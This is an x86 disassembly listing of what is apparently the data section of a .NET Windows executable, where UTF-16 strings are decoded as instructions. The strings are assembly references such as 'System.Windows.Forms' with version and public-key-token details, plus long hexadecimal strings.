  408d85:	add    BYTE PTR [eax+eax*1+0x69],dh
  408d89:	add    BYTE PTR [esi+0x0],ch
  408d8c:	add    BYTE PTR [si],ch
  408d8f:	add    BYTE PTR [eax],ah
  408d91:	add    BYTE PTR [esi+0x0],dl
  408d94:	add    BYTE PTR gs:[edx+0x0],dh
  408d98:	jae    0x408d9a
  408d9a:	imul   eax,DWORD PTR [eax],0x6e006f
  408da0:	cmp    eax,0x2e003200
  408da5:	add    BYTE PTR [eax],dh
  408da7:	add    BYTE PTR [esi],ch
  408da9:	add    BYTE PTR [eax],dh
  408dab:	add    BYTE PTR [esi],ch
  408dad:	add    BYTE PTR [eax],dh
  408daf:	add    BYTE PTR [eax+eax*1],ch
  408db2:	and    BYTE PTR [eax],al
  408db4:	inc    ebx
  408db5:	add    BYTE PTR [ebp+0x0],dh
  408db8:	ins    BYTE PTR es:[edi],dx
  408db9:	add    BYTE PTR [eax+eax*1+0x75],dh
  408dbd:	add    BYTE PTR [edx+0x0],dh
  408dc0:	add    BYTE PTR gs:0x65006e00,bh
  408dc7:	add    BYTE PTR [ebp+0x0],dh
  408dca:	je     0x408dcc
  408dcc:	jb     0x408dce
  408dce:	popa   
  408dcf:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408dd3:	add    BYTE PTR [eax],ah
  408dd5:	add    BYTE PTR [eax+0x0],dl
  408dd8:	jne    0x408dda
  408dda:	bound  eax,QWORD PTR [eax]
  408ddc:	ins    BYTE PTR es:[edi],dx
  408ddd:	add    BYTE PTR [ecx+0x0],ch
  408de0:	arpl   WORD PTR [eax],ax
  408de2:	dec    ebx
  408de3:	add    BYTE PTR [ebp+0x0],ah
  408de6:	jns    0x408de8
  408de8:	push   esp
  408de9:	add    BYTE PTR [edi+0x0],ch
  408dec:	imul   eax,DWORD PTR [eax],0x65
  408def:	add    BYTE PTR [esi+0x0],ch
  408df2:	cmp    eax,0x37006200
  408df7:	add    BYTE PTR [edi],dh
  408df9:	add    BYTE PTR [ecx+0x0],ah
  408dfc:	xor    eax,0x35006300
  408e01:	add    BYTE PTR [esi],dh
  408e03:	add    BYTE PTR [ecx],dh
  408e05:	add    BYTE PTR [ecx],bh
  408e07:	add    BYTE PTR [ebx],dh
  408e09:	add    BYTE PTR [eax+eax*1],dh
  408e0c:	add    BYTE PTR gs:[eax],dh
  408e0f:	add    BYTE PTR [eax],bh
  408e11:	add    BYTE PTR [ecx],bh
  408e13:	add    BYTE PTR [eax+0x790053ae],al
  408e19:	add    BYTE PTR [ebx+0x0],dh
  408e1c:	je     0x408e1e
  408e1e:	add    BYTE PTR gs:[ebp+0x0],ch
  408e22:	add    BYTE PTR cs:[edi+0x0],dl
  408e26:	imul   eax,DWORD PTR [eax],0x64006e
  408e2c:	outs   dx,DWORD PTR ds:[esi]
  408e2d:	add    BYTE PTR [edi+0x0],dh
  408e30:	jae    0x408e32
  408e32:	add    BYTE PTR cs:[esi+0x0],al
  408e36:	outs   dx,DWORD PTR ds:[esi]
  408e37:	add    BYTE PTR [edx+0x0],dh
  408e3a:	ins    DWORD PTR es:[edi],dx
  408e3b:	add    BYTE PTR [ebx+0x0],dh
  408e3e:	sub    al,0x0
  408e40:	and    BYTE PTR [eax],al
  408e42:	push   esi
  408e43:	add    BYTE PTR [ebp+0x0],ah
  408e46:	jb     0x408e48
  408e48:	jae    0x408e4a
  408e4a:	imul   eax,DWORD PTR [eax],0x6e006f
  408e50:	cmp    eax,0x2e003200
  408e55:	add    BYTE PTR [eax],dh
  408e57:	add    BYTE PTR [esi],ch
  408e59:	add    BYTE PTR [eax],dh
  408e5b:	add    BYTE PTR [esi],ch
  408e5d:	add    BYTE PTR [eax],dh
  408e5f:	add    BYTE PTR [eax+eax*1],ch
  408e62:	and    BYTE PTR [eax],al
  408e64:	inc    ebx
  408e65:	add    BYTE PTR [ebp+0x0],dh
  408e68:	ins    BYTE PTR es:[edi],dx
  408e69:	add    BYTE PTR [eax+eax*1+0x75],dh
  408e6d:	add    BYTE PTR [edx+0x0],dh
  408e70:	add    BYTE PTR gs:0x65006e00,bh
  408e77:	add    BYTE PTR [ebp+0x0],dh
  408e7a:	je     0x408e7c
  408e7c:	jb     0x408e7e
  408e7e:	popa   
  408e7f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408e83:	add    BYTE PTR [eax],ah
  408e85:	add    BYTE PTR [eax+0x0],dl
  408e88:	jne    0x408e8a
  408e8a:	bound  eax,QWORD PTR [eax]
  408e8c:	ins    BYTE PTR es:[edi],dx
  408e8d:	add    BYTE PTR [ecx+0x0],ch
  408e90:	arpl   WORD PTR [eax],ax
  408e92:	dec    ebx
  408e93:	add    BYTE PTR [ebp+0x0],ah
  408e96:	jns    0x408e98
  408e98:	push   esp
  408e99:	add    BYTE PTR [edi+0x0],ch
  408e9c:	imul   eax,DWORD PTR [eax],0x65
  408e9f:	add    BYTE PTR [esi+0x0],ch
  408ea2:	cmp    eax,0x37006200
  408ea7:	add    BYTE PTR [edi],dh
  408ea9:	add    BYTE PTR [ecx+0x0],ah
  408eac:	xor    eax,0x35006300
  408eb1:	add    BYTE PTR [esi],dh
  408eb3:	add    BYTE PTR [ecx],dh
  408eb5:	add    BYTE PTR [ecx],bh
  408eb7:	add    BYTE PTR [ebx],dh
  408eb9:	add    BYTE PTR [eax+eax*1],dh
  408ebc:	add    BYTE PTR gs:[eax],dh
  408ebf:	add    BYTE PTR [eax],bh
  408ec1:	add    BYTE PTR [ecx],bh
  408ec3:	add    BYTE PTR [eax+0x7900539a],al
  408ec9:	add    BYTE PTR [ebx+0x0],dh
  408ecc:	je     0x408ece
  408ece:	add    BYTE PTR gs:[ebp+0x0],ch
  408ed2:	add    BYTE PTR cs:[eax+0x0],bl
  408ed6:	ins    DWORD PTR es:[edi],dx
  408ed7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408edb:	add    BYTE PTR [eax],ah
  408edd:	add    BYTE PTR [esi+0x0],dl
  408ee0:	add    BYTE PTR gs:[edx+0x0],dh
  408ee4:	jae    0x408ee6
  408ee6:	imul   eax,DWORD PTR [eax],0x6e006f
  408eec:	cmp    eax,0x2e003200
  408ef1:	add    BYTE PTR [eax],dh
  408ef3:	add    BYTE PTR [esi],ch
  408ef5:	add    BYTE PTR [eax],dh
  408ef7:	add    BYTE PTR [esi],ch
  408ef9:	add    BYTE PTR [eax],dh
  408efb:	add    BYTE PTR [eax+eax*1],ch
  408efe:	and    BYTE PTR [eax],al
  408f00:	inc    ebx
  408f01:	add    BYTE PTR [ebp+0x0],dh
  408f04:	ins    BYTE PTR es:[edi],dx
  408f05:	add    BYTE PTR [eax+eax*1+0x75],dh
  408f09:	add    BYTE PTR [edx+0x0],dh
  408f0c:	add    BYTE PTR gs:0x65006e00,bh
  408f13:	add    BYTE PTR [ebp+0x0],dh
  408f16:	je     0x408f18
  408f18:	jb     0x408f1a
  408f1a:	popa   
  408f1b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408f1f:	add    BYTE PTR [eax],ah
  408f21:	add    BYTE PTR [eax+0x0],dl
  408f24:	jne    0x408f26
  408f26:	bound  eax,QWORD PTR [eax]
  408f28:	ins    BYTE PTR es:[edi],dx
  408f29:	add    BYTE PTR [ecx+0x0],ch
  408f2c:	arpl   WORD PTR [eax],ax
  408f2e:	dec    ebx
  408f2f:	add    BYTE PTR [ebp+0x0],ah
  408f32:	jns    0x408f34
  408f34:	push   esp
  408f35:	add    BYTE PTR [edi+0x0],ch
  408f38:	imul   eax,DWORD PTR [eax],0x65
  408f3b:	add    BYTE PTR [esi+0x0],ch
  408f3e:	cmp    eax,0x37006200
  408f43:	add    BYTE PTR [edi],dh
  408f45:	add    BYTE PTR [ecx+0x0],ah
  408f48:	xor    eax,0x35006300
  408f4d:	add    BYTE PTR [esi],dh
  408f4f:	add    BYTE PTR [ecx],dh
  408f51:	add    BYTE PTR [ecx],bh
  408f53:	add    BYTE PTR [ebx],dh
  408f55:	add    BYTE PTR [eax+eax*1],dh
  408f58:	add    BYTE PTR gs:[eax],dh
  408f5b:	add    BYTE PTR [eax],bh
  408f5d:	add    BYTE PTR [ecx],bh
  408f5f:	add    BYTE PTR [eax],ah
  408f61:	bound  eax,QWORD PTR [eax]
  408f63:	xor    BYTE PTR [eax],al
  408f65:	xor    eax,DWORD PTR [eax]
  408f67:	data16 add BYTE PTR ds:0x37006600,dh
  408f6e:	add    BYTE PTR [esi+0x0],ah
  408f71:	xor    DWORD PTR [eax],eax
  408f73:	xor    DWORD PTR [eax],eax
  408f75:	add    BYTE PTR fs:0x61003000,dh
  408f7c:	add    BYTE PTR [ebx],dh
  408f7e:	add    BYTE PTR [ecx+0x0],ah
  408f81:	add    BYTE PTR [eax+0x300030],0x32
  408f88:	add    BYTE PTR [eax+eax*1],dh
  408f8b:	xor    BYTE PTR [eax],al
  408f8d:	xor    BYTE PTR [eax],al
  408f8f:	xor    BYTE PTR [eax],al
  408f91:	xor    BYTE PTR [eax],al
  408f93:	xor    BYTE PTR [eax],al
  408f95:	xor    al,0x0
  408f97:	cmp    BYTE PTR [eax],al
  408f99:	xor    BYTE PTR [eax],al
  408f9b:	xor    BYTE PTR [eax],al
  408f9d:	xor    BYTE PTR [eax],al
  408f9f:	xor    BYTE PTR [eax],al
  408fa1:	xor    BYTE PTR [eax],al
  408fa3:	cmp    DWORD PTR [eax],eax
  408fa5:	xor    al,0x0
  408fa7:	xor    BYTE PTR [eax],al
  408fa9:	xor    BYTE PTR [eax],al
  408fab:	xor    BYTE PTR [eax],al
  408fad:	xor    BYTE PTR [eax],al
  408faf:	xor    BYTE PTR [eax],al
  408fb1:	xor    BYTE PTR [eax],al
  408fb3:	xor    BYTE PTR [eax],al
  408fb5:	add    BYTE PTR ss:[eax],dh
  408fb8:	add    BYTE PTR [edx],dh
  408fba:	add    BYTE PTR [eax],dh
  408fbc:	add    BYTE PTR [eax],dh
  408fbe:	add    BYTE PTR [eax],dh
  408fc0:	add    BYTE PTR [eax],dh
  408fc2:	add    BYTE PTR [eax],dh
  408fc4:	add    BYTE PTR [eax],dh
  408fc6:	add    BYTE PTR [edx],dh
  408fc8:	add    BYTE PTR [eax+eax*1],dh
  408fcb:	xor    BYTE PTR [eax],al
  408fcd:	xor    BYTE PTR [eax],al
  408fcf:	xor    BYTE PTR [eax],al
  408fd1:	xor    BYTE PTR [eax],al
  408fd3:	xor    eax,0x35003200
  408fd8:	add    BYTE PTR [ebx],dh
  408fda:	add    BYTE PTR [eax+eax*1],dh
  408fdd:	xor    DWORD PTR [eax],eax
  408fdf:	xor    eax,DWORD PTR [eax]
  408fe1:	xor    DWORD PTR [eax],eax
  408fe3:	xor    BYTE PTR [eax],al
  408fe5:	xor    BYTE PTR [eax],al
  408fe7:	xor    BYTE PTR [eax],al
  408fe9:	xor    al,0x0
  408feb:	xor    BYTE PTR [eax],al
  408fed:	xor    BYTE PTR [eax],al
  408fef:	xor    BYTE PTR [eax],al
  408ff1:	xor    BYTE PTR [eax],al
  408ff3:	xor    BYTE PTR [eax],al
  408ff5:	xor    DWORD PTR [eax],eax
  408ff7:	xor    BYTE PTR [eax],al
  408ff9:	xor    BYTE PTR [eax],al
  408ffb:	xor    BYTE PTR [eax],al
  408ffd:	xor    DWORD PTR [eax],eax
  408fff:	xor    BYTE PTR [eax],al
  409001:	xor    BYTE PTR [eax],al
  409003:	xor    BYTE PTR [eax],al
  409005:	aaa    
  409006:	add    BYTE PTR [eax+eax*1+0x31],al
  40900a:	add    BYTE PTR [esi+0x0],al
  40900d:	inc    ecx
  40900e:	add    BYTE PTR ds:0x43003700,dh
  409014:	add    BYTE PTR [eax+eax*1],dh
  409017:	inc    ecx
  409018:	add    BYTE PTR [ebp+0x0],al
  40901b:	inc    esp
  40901c:	add    BYTE PTR [ecx],bh
  40901e:	add    BYTE PTR [esi+0x0],al
  409021:	xor    BYTE PTR [eax],al
  409023:	inc    ecx
  409024:	add    BYTE PTR [ebx],dh
  409026:	add    BYTE PTR [edx],dh
  409028:	add    BYTE PTR [ebp+0x0],al
  40902b:	cmp    BYTE PTR [eax],al
  40902d:	xor    al,0x0
  40902f:	inc    ecx
  409030:	add    BYTE PTR [ecx+0x0],al
  409033:	xor    BYTE PTR [eax],al
  409035:	inc    esi
  409036:	add    BYTE PTR [ecx+0x0],al
  409039:	inc    ebp
  40903a:	add    BYTE PTR [esi+0x0],al
  40903d:	inc    esp
  40903e:	add    BYTE PTR [eax],dh
  409040:	add    BYTE PTR [eax+eax*1+0x45],al
  409044:	add    BYTE PTR [ecx],bh
  409046:	add    BYTE PTR [ebp+0x0],al
  409049:	cmp    BYTE PTR [eax],al
  40904b:	inc    esi
  40904c:	add    BYTE PTR [eax+eax*1+0x36],al
  409050:	add    BYTE PTR [ecx+0x0],al
  409053:	inc    ebp
  409054:	add    BYTE PTR [ebx+0x0],al
  409057:	cmp    BYTE PTR [eax],al
  409059:	inc    esi
  40905a:	add    BYTE PTR [eax],bh
  40905c:	add    BYTE PTR [edi],dh
  40905e:	add    BYTE PTR [esi+0x0],al
  409061:	inc    edx
  409062:	add    BYTE PTR [eax],dh
  409064:	add    BYTE PTR [ebx],dh
  409066:	add    BYTE PTR [edi],dh
  409068:	add    BYTE PTR [esi],dh
  40906a:	add    BYTE PTR [esi],dh
  40906c:	add    BYTE PTR [ebx+0x0],al
  40906f:	cmp    BYTE PTR [eax],al
  409071:	xor    eax,DWORD PTR [eax]
  409073:	xor    al,0x0
  409075:	inc    ebx
  409076:	add    BYTE PTR [ecx],bh
  409078:	add    BYTE PTR [ecx],bh
  40907a:	add    BYTE PTR [ecx],bh
  40907c:	add    BYTE PTR [edx],dh
  40907e:	add    BYTE PTR [ecx],dh
  409080:	add    BYTE PTR [ebp+0x0],al
  409083:	inc    edx
  409084:	add    BYTE PTR [edx],dh
  409086:	add    BYTE PTR [ebx],dh
  409088:	add    BYTE PTR [edx+0x0],al
  40908b:	inc    ebp
  40908c:	add    BYTE PTR [edi],dh
  40908e:	add    BYTE PTR [ecx],bh
  409090:	add    BYTE PTR [ecx+0x0],al
  409093:	inc    esp
  409094:	add    BYTE PTR [ecx],bh
  409096:	add    BYTE PTR [eax+eax*1+0x35],al
  40909a:	add    BYTE PTR [eax+eax*1+0x43],al
  40909e:	add    BYTE PTR [ebx+0x0],al
  4090a1:	xor    DWORD PTR [eax],eax
  4090a3:	inc    esp
  4090a4:	add    BYTE PTR [eax+eax*1+0x39],al
  4090a8:	add    BYTE PTR [ecx+0x0],al
  4090ab:	inc    esp
  4090ac:	add    BYTE PTR [edx],dh
  4090ae:	add    BYTE PTR [ebx],dh
  4090b0:	add    BYTE PTR [esi],dh
  4090b2:	add    BYTE PTR [ecx],dh
  4090b4:	add    BYTE PTR [ebx],dh
  4090b6:	add    BYTE PTR [edx],dh
  4090b8:	add    BYTE PTR [ecx],dh
  4090ba:	add    BYTE PTR [eax],dh
  4090bc:	add    BYTE PTR [edx],dh
  4090be:	add    BYTE PTR [ecx],bh
  4090c0:	add    BYTE PTR [eax],dh
  4090c2:	add    BYTE PTR [eax],dh
  4090c4:	add    BYTE PTR [edx+0x0],al
  4090c7:	aaa    
  4090c8:	add    BYTE PTR [edx],dh
  4090ca:	add    BYTE PTR [ebx],dh
  4090cc:	add    BYTE PTR [ebx+0x0],al
  4090cf:	inc    esi
  4090d0:	add    BYTE PTR [ecx],bh
  4090d2:	add    BYTE PTR [eax],bh
  4090d4:	add    BYTE PTR [eax],dh
  4090d6:	add    BYTE PTR [ecx],bh
  4090d8:	add    BYTE PTR ds:0x46003700,dh
  4090de:	add    BYTE PTR [ebx+0x0],al
  4090e1:	xor    al,0x0
  4090e3:	inc    ebp
  4090e4:	add    BYTE PTR [ecx],dh
  4090e6:	add    BYTE PTR [edi],dh
  4090e8:	add    BYTE PTR [edi],dh
  4090ea:	add    BYTE PTR [ecx],dh
  4090ec:	add    BYTE PTR [eax],dh
  4090ee:	add    BYTE PTR [eax],bh
  4090f0:	add    BYTE PTR [esi+0x0],al
  4090f3:	inc    ebx
  4090f4:	add    BYTE PTR [esi],dh
  4090f6:	add    BYTE PTR [eax],dh
  4090f8:	add    BYTE PTR [edi],dh
  4090fa:	add    BYTE PTR [edi],dh
  4090fc:	add    BYTE PTR [edi],dh
  4090fe:	add    BYTE PTR [eax+eax*1],dh
  409101:	inc    esi
  409102:	add    BYTE PTR [edx],dh
  409104:	add    BYTE PTR [ecx],bh
  409106:	add    BYTE PTR [ebp+0x0],al
  409109:	cmp    BYTE PTR [eax],al
  40910b:	xor    eax,DWORD PTR [eax]
  40910d:	xor    al,BYTE PTR [eax]
  40910f:	xor    BYTE PTR [eax],al
  409111:	inc    ebp
  409112:	add    BYTE PTR [ecx],bh
  409114:	add    BYTE PTR [edx],dh
  409116:	add    BYTE PTR [ebp+0x0],al
  409119:	inc    ecx
  40911a:	add    BYTE PTR [eax],dh
  40911c:	add    BYTE PTR ds:0x43004500,dh
  409122:	add    BYTE PTR [ebp+0x0],al
  409125:	xor    al,0x0
  409127:	inc    ebp
  409128:	add    BYTE PTR [eax],bh
  40912a:	add    BYTE PTR [edx],dh
  40912c:	add    BYTE PTR [ecx],dh
  40912e:	add    BYTE PTR [ebx+0x0],al
  409131:	xor    BYTE PTR [eax],al
  409133:	inc    ecx
  409134:	add    BYTE PTR ds:0x46004500,dh
  40913a:	add    BYTE PTR [ebp+0x0],al
  40913d:	cmp    BYTE PTR [eax],al
  40913f:	inc    esi
  409140:	add    BYTE PTR [ecx],dh
  409142:	add    BYTE PTR [esi],dh
  409144:	add    BYTE PTR [eax+eax*1],dh
  409147:	xor    eax,0x34004300
  40914c:	add    BYTE PTR [ebx+0x0],al
  40914f:	xor    BYTE PTR [eax],al
  409151:	inc    ebx
  409152:	add    BYTE PTR [ecx],bh
  409154:	add    BYTE PTR [ebx],dh
  409156:	add    BYTE PTR [ebx+0x0],al
  409159:	xor    DWORD PTR [eax],eax
  40915b:	inc    ecx
  40915c:	add    BYTE PTR [edx+0x0],al
  40915f:	cmp    DWORD PTR [eax],eax
  409161:	cmp    DWORD PTR [eax],eax
  409163:	xor    al,BYTE PTR [eax]
  409165:	cmp    BYTE PTR [eax],al
  409167:	xor    eax,0x36004400
  40916c:	add    BYTE PTR [edx],dh
  40916e:	add    BYTE PTR [edx],dh
  409170:	add    BYTE PTR [ebx+0x0],al
  409173:	inc    ecx
  409174:	add    BYTE PTR [ecx+0x0],al
  409177:	add    BYTE PTR ss:0x43003200,dh
  40917e:	add    BYTE PTR [ecx],dh
  409180:	add    BYTE PTR [eax+eax*1+0x46],al
  409184:	add    BYTE PTR [ecx+0x0],al
  409187:	inc    esp
  409188:	add    BYTE PTR [esi],dh
  40918a:	add    BYTE PTR [ebx],dh
  40918c:	add    BYTE PTR [eax+eax*1+0x37],al
  409190:	add    BYTE PTR [eax+eax*1],dh
  409193:	xor    eax,0x36004400
  409198:	add    BYTE PTR [esi+0x0],al
  40919b:	xor    al,BYTE PTR [eax]
  40919d:	inc    esp
  40919e:	add    BYTE PTR [ebp+0x0],al
  4091a1:	xor    eax,0x31004600
  4091a6:	add    BYTE PTR [edi],dh
  4091a8:	add    BYTE PTR [ebp+0x0],al
  4091ab:	xor    eax,0x41004500
  4091b0:	add    BYTE PTR [esi+0x0],al
  4091b3:	xor    BYTE PTR [eax],al
  4091b5:	inc    esi
  4091b6:	add    BYTE PTR [ebx+0x0],al
  4091b9:	xor    al,0x0
  4091bb:	cmp    DWORD PTR [eax],eax
  4091bd:	add    BYTE PTR ss:[ebx],dh
  4091c0:	add    BYTE PTR [eax+eax*1+0x32],al
  4091c4:	add    BYTE PTR [esi],dh
  4091c6:	add    BYTE PTR [ecx],dh
  4091c8:	add    BYTE PTR [ebx+0x0],al
  4091cb:	cmp    BYTE PTR [eax],al
  4091cd:	inc    ecx
  4091ce:	add    BYTE PTR [ecx],dh
  4091d0:	add    BYTE PTR [edx],dh
  4091d2:	add    BYTE PTR [eax+eax*1],dh
  4091d5:	xor    eax,DWORD PTR [eax]
  4091d7:	add    BYTE PTR ss:0x38003100,dh
  4091de:	add    BYTE PTR [edx],dh
  4091e0:	add    BYTE PTR [eax],dh
  4091e2:	add    BYTE PTR [esi],dh
  4091e4:	add    BYTE PTR [eax+eax*1+0x43],al
  4091e8:	add    BYTE PTR [eax],dh
  4091ea:	add    BYTE PTR [ecx],bh
  4091ec:	add    BYTE PTR [ebx],dh
  4091ee:	add    BYTE PTR [ebx],dh
  4091f0:	add    BYTE PTR [eax+eax*1],dh
  4091f3:	xor    al,0x0
  4091f5:	inc    esp
  4091f6:	add    BYTE PTR ds:0x44004100,dh
  4091fc:	add    BYTE PTR [edx],dh
  4091fe:	add    BYTE PTR [ecx],bh
  409200:	add    BYTE PTR [ebx],dh
  409202:	add    BYTE PTR [eax],ah
  409204:	xor    eax,DWORD PTR [eax]
  409206:	xor    DWORD PTR [eax],eax
  409208:	bound  eax,QWORD PTR [eax]
  40920a:	data16 add BYTE PTR [ebx],dh
  40920d:	add    BYTE PTR [eax],bh
  40920f:	add    BYTE PTR ds:0x61003600,dh
  409215:	add    BYTE PTR [eax+eax*1+0x33],ah
  409219:	add    BYTE PTR [esi],dh
  40921b:	add    BYTE PTR [eax+eax*1],dh
  40921e:	add    BYTE PTR gs:[ebx],dh
  409221:	add    BYTE PTR ds:0x30808200,dh
  409227:	add    BYTE PTR [eax],dh
  409229:	add    BYTE PTR [edx],dh
  40922b:	add    BYTE PTR [eax+eax*1],dh
  40922e:	xor    BYTE PTR [eax],al
  409230:	xor    BYTE PTR [eax],al
  409232:	xor    BYTE PTR [eax],al
  409234:	xor    BYTE PTR [eax],al
  409236:	xor    BYTE PTR [eax],al
  409238:	xor    al,0x0
  40923a:	cmp    BYTE PTR [eax],al
  40923c:	xor    BYTE PTR [eax],al
  40923e:	xor    BYTE PTR [eax],al
  409240:	xor    BYTE PTR [eax],al
  409242:	xor    BYTE PTR [eax],al
  409244:	xor    BYTE PTR [eax],al
  409246:	cmp    DWORD PTR [eax],eax
  409248:	xor    al,0x0
  40924a:	xor    BYTE PTR [eax],al
  40924c:	xor    BYTE PTR [eax],al
  40924e:	xor    BYTE PTR [eax],al
  409250:	xor    BYTE PTR [eax],al
  409252:	xor    BYTE PTR [eax],al
  409254:	xor    BYTE PTR [eax],al
  409256:	xor    BYTE PTR [eax],al
  409258:	add    BYTE PTR ss:[eax],dh
  40925b:	add    BYTE PTR [edx],dh
  40925d:	add    BYTE PTR [eax],dh
  40925f:	add    BYTE PTR [eax],dh
  409261:	add    BYTE PTR [eax],dh
  409263:	add    BYTE PTR [eax],dh
  409265:	add    BYTE PTR [eax],dh
  409267:	add    BYTE PTR [eax],dh
  409269:	add    BYTE PTR [edx],dh
  40926b:	add    BYTE PTR [eax+eax*1],dh
  40926e:	xor    BYTE PTR [eax],al
  409270:	xor    BYTE PTR [eax],al
  409272:	xor    BYTE PTR [eax],al
  409274:	xor    BYTE PTR [eax],al
  409276:	xor    eax,0x35003200
  40927b:	add    BYTE PTR [ebx],dh
  40927d:	add    BYTE PTR [eax+eax*1],dh
  409280:	xor    DWORD PTR [eax],eax
  409282:	xor    eax,DWORD PTR [eax]
  409284:	xor    DWORD PTR [eax],eax
  409286:	xor    BYTE PTR [eax],al
  409288:	xor    BYTE PTR [eax],al
  40928a:	xor    BYTE PTR [eax],al
  40928c:	xor    al,0x0
  40928e:	xor    BYTE PTR [eax],al
  409290:	xor    BYTE PTR [eax],al
  409292:	xor    BYTE PTR [eax],al
  409294:	xor    BYTE PTR [eax],al
  409296:	xor    BYTE PTR [eax],al
  409298:	xor    DWORD PTR [eax],eax
  40929a:	xor    BYTE PTR [eax],al
  40929c:	xor    BYTE PTR [eax],al
  40929e:	xor    BYTE PTR [eax],al
  4092a0:	xor    DWORD PTR [eax],eax
  4092a2:	xor    BYTE PTR [eax],al
  4092a4:	xor    BYTE PTR [eax],al
  4092a6:	inc    edx
  4092a7:	add    BYTE PTR ds:0x43004600,dh
  4092ad:	add    BYTE PTR [ecx],bh
  4092af:	add    BYTE PTR [eax],dh
  4092b1:	add    BYTE PTR [ebp+0x0],al
  4092b4:	aaa    
  4092b5:	add    BYTE PTR [eax],dh
  4092b7:	add    BYTE PTR [edx],dh
  4092b9:	add    BYTE PTR [edi],dh
  4092bb:	add    BYTE PTR [esi+0x0],al
  4092be:	add    BYTE PTR ss:[edi],dh
  4092c1:	add    BYTE PTR [eax],bh
  4092c3:	add    BYTE PTR [edi],dh
  4092c5:	add    BYTE PTR [ecx],dh
  4092c7:	add    BYTE PTR [ebp+0x0],al
  4092ca:	aaa    
  4092cb:	add    BYTE PTR [edi],dh
  4092cd:	add    BYTE PTR [ebx],dh
  4092cf:	add    BYTE PTR [ecx+0x0],al
  4092d2:	cmp    BYTE PTR [eax],al
  4092d4:	inc    esi
  4092d5:	add    BYTE PTR [eax+eax*1+0x45],al
  4092d9:	add    BYTE PTR [eax],bh
  4092db:	add    BYTE PTR [ecx],bh
  4092dd:	add    BYTE PTR [ebx],dh
  4092df:	add    BYTE PTR [eax],bh
  4092e1:	add    BYTE PTR [ebx+0x0],al
  4092e4:	cmp    BYTE PTR [eax],al
  4092e6:	xor    DWORD PTR [eax],eax
  4092e8:	inc    esp
  4092e9:	add    BYTE PTR [eax+eax*1+0x34],al
  4092ed:	add    BYTE PTR [eax],dh
  4092ef:	add    BYTE PTR [edx],dh
  4092f1:	add    BYTE PTR [edx+0x0],al
  4092f4:	inc    ecx
  4092f5:	add    BYTE PTR [esi],dh
  4092f7:	add    BYTE PTR ds:0x39004200,dh
  4092fd:	add    BYTE PTR [edx],dh
  4092ff:	add    BYTE PTR [eax],dh
  409301:	add    BYTE PTR [ecx],dh
  409303:	add    BYTE PTR [eax+eax*1+0x36],al
  409307:	add    BYTE PTR [eax],dh
  409309:	add    BYTE PTR ds:0x33003900,dh
  40930f:	add    BYTE PTR [ebp+0x0],al
  409312:	cmp    DWORD PTR [eax],eax
  409314:	add    BYTE PTR ss:[ebx+0x0],al
  409318:	xor    al,0x0
  40931a:	cmp    DWORD PTR [eax],eax
  40931c:	xor    al,BYTE PTR [eax]
  40931e:	add    BYTE PTR ss:0x45003100,dh
  409325:	add    BYTE PTR [eax],bh
  409327:	add    BYTE PTR [eax],bh
  409329:	add    BYTE PTR [ecx],bh
  40932b:	add    BYTE PTR [ebx+0x0],al
  40932e:	inc    ebx
  40932f:	add    BYTE PTR [ecx],dh
  409331:	add    BYTE PTR [ebx],dh
  409333:	add    BYTE PTR [esi+0x0],al
  409336:	xor    DWORD PTR [eax],eax
  409338:	xor    al,0x0
  40933a:	xor    DWORD PTR [eax],eax
  40933c:	xor    eax,0x42004500
  409341:	add    BYTE PTR [edx+0x0],al
  409344:	xor    eax,0x46003300
  409349:	add    BYTE PTR [ecx+0x0],al
  40934c:	inc    ebx
  40934d:	add    BYTE PTR [ecx],dh
  40934f:	add    BYTE PTR [ecx],dh
  409351:	add    BYTE PTR [ebx],dh
  409353:	add    BYTE PTR [ecx],dh
  409355:	add    BYTE PTR [ecx+0x0],al
  409358:	inc    ebp
  409359:	add    BYTE PTR [eax],dh
  40935b:	add    BYTE PTR [edx+0x0],al
  40935e:	inc    esp
  40935f:	add    BYTE PTR [ebx],dh
  409361:	add    BYTE PTR [ebx],dh
  409363:	add    BYTE PTR [ebx],dh
  409365:	add    BYTE PTR [ebx+0x0],al
  409368:	xor    eax,0x45004500
  40936d:	add    BYTE PTR [esi],dh
  40936f:	add    BYTE PTR [eax],dh
  409371:	add    BYTE PTR [edx],dh
  409373:	add    BYTE PTR [ecx],dh
  409375:	add    BYTE PTR [esi],dh
  409377:	add    BYTE PTR [edi],dh
  409379:	add    BYTE PTR [edx],dh
  40937b:	add    BYTE PTR [eax+eax*1+0x39],al
  40937f:	add    BYTE PTR [edi],dh
  409381:	add    BYTE PTR [ecx],dh
  409383:	add    BYTE PTR [eax],bh
  409385:	add    BYTE PTR [ebp+0x0],al
  409388:	inc    ecx
  409389:	add    BYTE PTR [ebx],dh
  40938b:	add    BYTE PTR [ecx],dh
  40938d:	add    BYTE PTR [ecx+0x0],al
  409390:	cmp    BYTE PTR [eax],al
  409392:	inc    ecx
  409393:	add    BYTE PTR [ebp+0x0],al
  409396:	inc    edx
  409397:	add    BYTE PTR [eax+eax*1+0x30],al
  40939b:	add    BYTE PTR [eax+eax*1+0x41],al
  40939f:	add    BYTE PTR [eax],dh
  4093a1:	add    BYTE PTR [eax],dh
  4093a3:	add    BYTE PTR [edi],dh
  4093a5:	add    BYTE PTR [edx],dh
  4093a7:	add    BYTE PTR [esi+0x0],al
  4093aa:	xor    al,BYTE PTR [eax]
  4093ac:	xor    eax,0x38004400
  4093b1:	add    BYTE PTR [edi],dh
  4093b3:	add    BYTE PTR [eax+eax*1+0x42],al
  4093b7:	add    BYTE PTR [ecx+0x0],al
  4093ba:	add    BYTE PTR ss:[esi+0x0],al
  4093be:	inc    ebx
  4093bf:	add    BYTE PTR [ecx],bh
  4093c1:	add    BYTE PTR [eax],dh
  4093c3:	add    BYTE PTR [esi+0x0],al
  4093c6:	inc    esi
  4093c7:	add    BYTE PTR [eax+eax*1+0x35],al
  4093cb:	add    BYTE PTR [ecx],bh
  4093cd:	add    BYTE PTR [eax],bh
  4093cf:	add    BYTE PTR [ebp+0x0],al
  4093d2:	inc    esp
  4093d3:	add    BYTE PTR [eax+eax*1],dh
  4093d6:	inc    esp
  4093d7:	add    BYTE PTR [ecx+0x0],al
  4093da:	xor    eax,DWORD PTR [eax]
  4093dc:	xor    eax,0x34004500
  4093e1:	add    BYTE PTR [eax+eax*1],dh
  4093e4:	inc    ebx
  4093e5:	add    BYTE PTR [ebx],dh
  4093e7:	add    BYTE PTR [ecx],bh
